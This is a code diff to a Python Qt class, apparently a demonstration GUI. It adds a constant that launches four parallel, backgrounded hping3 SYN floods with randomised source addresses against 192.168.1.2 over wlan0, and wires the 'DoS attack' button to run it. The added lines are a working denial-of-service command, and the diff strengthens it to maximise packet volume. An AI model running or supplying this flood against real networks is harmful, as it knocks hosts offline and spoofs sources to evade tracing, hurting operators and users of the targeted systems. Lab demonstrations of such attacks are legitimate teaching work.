@@ -254,12 +254,20 @@ class DemonstrationView(QWidget):
 
     # ── DoS attack ────────────────────────────────────────────────────────────
 
+    # Four parallel flood instances to maximise packet volume
+    _DOS_CMD = (
+        "for i in 1 2 3 4; do "
+        "nohup sudo hping3 -I wlan0 -S -d 1000 -q --flood --rand-source 192.168.1.2 "
+        "> /dev/null 2>&1 & "
+        "done"
+    )
+
     def _on_dos_btn_clicked(self):
         self._set_buttons_enabled(False)
         if not self._dos_running:
             self._status_label.setText("Starting DoS attack…")
             self._run_background_start(
-                "sudo hping3 -I wlan0 -S -d 1000 -q --flood --rand-source 192.168.1.2",
+                self._DOS_CMD,
                 callback=self._on_dos_started,
             )
         else:
